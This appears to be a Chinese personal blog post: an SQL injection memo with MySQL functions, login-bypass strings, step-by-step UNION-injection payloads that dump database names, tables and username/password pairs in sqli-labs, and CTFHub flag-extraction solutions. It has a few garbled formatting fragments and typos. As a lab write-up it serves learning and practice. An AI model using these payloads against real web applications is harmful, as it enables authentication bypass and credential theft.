<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Code for fun, Hack for world">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        SQL注入-基本查询及注入备忘 - undefined
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 6.0.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> Code for fun, Hack for world </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/images/avatar.jpg" />
        </div>
        <div class="name">
            <i>Noname</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E6%9C%AC%E6%9F%A5%E8%AF%A2%E5%8F%8A%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">SQL注入-基本查询及注入语句</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="toc-text">MYSQL数据库结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">MySQL常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5"><span class="toc-text">SQL基本语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%A4%87%E5%BF%98"><span class="toc-text">万能密码备忘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E6%A0%B8%E5%BF%83%E8%AF%AD%E6%B3%95"><span class="toc-text">查询数据核心语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION%E6%B3%A8%E5%85%A5"><span class="toc-text">UNION注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CTFHub-Sql%E6%B3%A8%E5%85%A5"><span class="toc-text">CTFHub-Sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">整数型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">字符型注入</span></a></li></ol></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> Code for fun, Hack for world </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        SQL注入-基本查询及注入备忘
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2022-01-20 11:01:01</span></span>
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="SQL注入-基本查询及注入语句"><a href="#SQL注入-基本查询及注入语句" class="headerlink" title="SQL注入-基本查询及注入语句"></a>SQL注入-基本查询及注入语句</h1><h2 id="MYSQL数据库结构"><a href="#MYSQL数据库结构" class="headerlink" title="MYSQL数据库结构"></a>MYSQL数据库结构</h2><p>数据库–表–列–字段</p>
<h2 id="MySQL常用函数"><a href="#MySQL常用函数" class="headerlink" title="MySQL常用函数"></a>MySQL常用函数</h2><p>读文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;path&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>写文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;path&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>ASCII()/ORD()</strong> 返回字符串的ascii码值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ord(); <span class="comment">-- 返回第一个ascii码值</span></span><br></pre></td></tr></table></figure>

<p><strong>MID()/SUBSTR()</strong> 返回一个字符串的一部分</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;mysql&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>); <span class="comment">-- my</span></span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;mysql&#x27;</span>, <span class="number">2</span>,<span class="number">2</span>); <span class="comment">--- ys</span></span><br><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;mysql&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>); <span class="comment">-- my</span></span><br></pre></td></tr></table></figure>

<p><strong>LEFT()</strong> 返回字符串最左边的几个字符</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;mysql&#x27;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><strong>SLEEP()</strong> 让此语句运行N秒钟</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sleep(N);</span><br><span class="line"><span class="keyword">select</span> if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">-- 3 若第一个参数为真，则返回第一个参数，否则第二个</span></span><br></pre></td></tr></table></figure>

<p><strong>STRCMP()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> strcmp(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>); # <span class="number">-1</span></span><br><span class="line"><span class="keyword">select</span> strcmp(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>); # <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> strcmp(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>); # <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>IFNULL()</strong> 假如参数1不为null，则返回值为参数1，否则返回值为参数2</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ifnull(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>, <span class="number">2</span>); <span class="comment">--2.0000</span></span><br></pre></td></tr></table></figure>

<p><strong>exp()</strong> 返回e的x次方</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">1</span>); <span class="comment">--2.71828</span></span><br></pre></td></tr></table></figure>

<h2 id="SQL基本语句"><a href="#SQL基本语句" class="headerlink" title="SQL基本语句"></a>SQL基本语句</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases; #显示所有数据库</span><br><span class="line">use 数据库名字; #使用数据库</span><br><span class="line"><span class="keyword">show</span> tables; #显示所有表单</span><br></pre></td></tr></table></figure>

<p>SELECT 列名称 FROM 表名称 WHERE 条件 #从表中选取数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span><span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>;  #<span class="operator">*</span>表示所有列</span><br></pre></td></tr></table></figure>

<p>UPDATE 表名称 SET 列名称 = 新值 WHERE 条件 #修改表中某只 ex:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名称(字段名称) <span class="keyword">values</span> (值<span class="number">1</span>, 值<span class="number">2</span>)</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> (表) <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure>

<p>union select 联合查询</p>
<p>UNION操作符用于合并两个或多个SELECT语句的结果集（UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每个SELECT语句中的列的顺序必须相同）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>

<h2 id="万能密码备忘"><a href="#万能密码备忘" class="headerlink" title="万能密码备忘"></a>万能密码备忘</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>分析万能密码如何被解析 通过闭合引号以及注释后面的内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> # 输入的内容</span><br><span class="line"><span class="string">&#x27; and pwd= &#x27;</span></span><br><span class="line"><span class="string">&#x27;or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> # 输入的内容</span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="查询数据核心语法"><a href="#查询数据核心语法" class="headerlink" title="查询数据核心语法"></a>查询数据核心语法</h2><p>获取当前数据库用户、名称、版本信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(), database(), version <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p><strong>查库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><strong>查表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>库名</span><br><span class="line"># 方法<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br><span class="line"># 方法<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;database_name&#x27;</span>;</span><br><span class="line"># 方法<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> database());</span><br></pre></td></tr></table></figure>

<p><strong>查列</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>查数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> 库名.表名</span><br></pre></td></tr></table></figure>

<p>若数据太多导致无法返回查询结果</p>
<p>查询：可以用limit限定返回的数量和位置回显</p>
<p>若页面只能回显一条数据，可以使用concat 语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>

<p>爆库的过程中可以使用 concat_ws 使得数据更清晰(加入-作为分隔符)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;-&#x27;</span>,username,password) <span class="keyword">from</span> security.users limit <span class="number">0</span>, <span class="number">1</span>) <span class="comment">--+)</span></span><br></pre></td></tr></table></figure>

<h3 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h3><p>union操作符用于合并两个及以上的多个SELECT语句的结果集 注意：UNION内部的SELECT语句必须拥有相同数量的列，列要拥有相似的数据类型，且每条SELECT语句的列的顺序必须相同，默认是选取不同的值，若允许重复的值需要使用UNION ALL</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 1.<strong>只有最后有个SELECT语句允许有ORDER BY</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">union</span> selet <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="comment">-- 错误</span></span><br></pre></td></tr></table></figure>

<p>2.<strong>只有最后有个SELECT子句允许有LIMIT</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="comment">-- 错误</span></span><br><span class="line">```se</span><br><span class="line"><span class="number">3.</span><span class="operator">*</span><span class="operator">*</span>只要<span class="keyword">UNION</span>连接的几个查询的字段数一样且列的数据类型转换没有问题即可查询出结果<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"><span class="number">4.</span><span class="operator">*</span><span class="operator">*</span>注入点页面要有回显<span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">#### 注意流程</span><br><span class="line"><span class="number">1.</span><span class="keyword">ORDER</span> <span class="keyword">BY</span> 确定列数 二分法快速判断</span><br><span class="line"><span class="number">2.</span>观察页面返回，选取可以显示数据的位置，继续注入</span><br><span class="line"><span class="number">3.</span>读库信息</span><br><span class="line"><span class="number">4.</span>读表信息</span><br><span class="line"><span class="number">5.</span>读字段</span><br><span class="line"><span class="number">6.</span>读数据</span><br><span class="line"></span><br><span class="line">详细试水案例</span><br><span class="line">Less<span class="number">-1</span></span><br><span class="line">```<span class="keyword">sql</span></span><br><span class="line"><span class="number">1</span>` <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure>

<p>所以利用报错信息，得到列数为3</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>

<p>理解：原本表中有3列，id name password union select 1,2,3对应了3列，所以数字2和3出现在了name和password的位置 所以可以利用这两列的位置进行注入和回显信息</p>
<p>sql语句分析：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p><strong>爆表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方式1 一条一条爆</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>;</span><br><span class="line"><span class="comment">-- 方式2 拼接的方式爆出所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat( schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span>;</span><br></pre></td></tr></table></figure>



<p>注入语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,(select schema_name from information_schema.schemata limit 4,1)--+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>emmm显然应该(或许大概)是这张security库啦 <strong>读表信息</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注入语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p>要读取账户密码，所以选择users表</p>
<p><strong>读段信息</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注入语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>直接读取username和password就可以</p>
<p><strong>读数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat_ws(<span class="string">&#x27;;&#x27;</span>,username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>注：可以使用库名的十六进制代替 database() 当前表</p>
<p>补充一些内容： 字段数判断 SELECT * FROM users limit 1,1 into @,@,@</p>
<p>concat函数在连接字符串时，只要其中一个是null，将返回null</p>
<p>concat_ws则会返回不为null的部分</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">select</span> concat_ws(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>,<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="CTFHub-Sql注入"><a href="#CTFHub-Sql注入" class="headerlink" title="CTFHub-Sql注入"></a>CTFHub-Sql注入</h3><h4 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h4><p>payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 回显正常</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 无回显</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database() # 回显当前库名是sqli</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> #爆出表名 news, flag</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> #爆出列名flag</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(flag) <span class="keyword">from</span> sqli.flag #爆flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
<p>回显：<br>select * from news where id=’1’’<br>。。。<br>payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2# 回显正常，得2列</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()# 得库名sqli</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27;# 得表名 news flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span># 得列名id,data,flag</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1, group_concat(flag) from sqli.flag # 得flag</span></span><br></pre></td></tr></table></figure>
        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
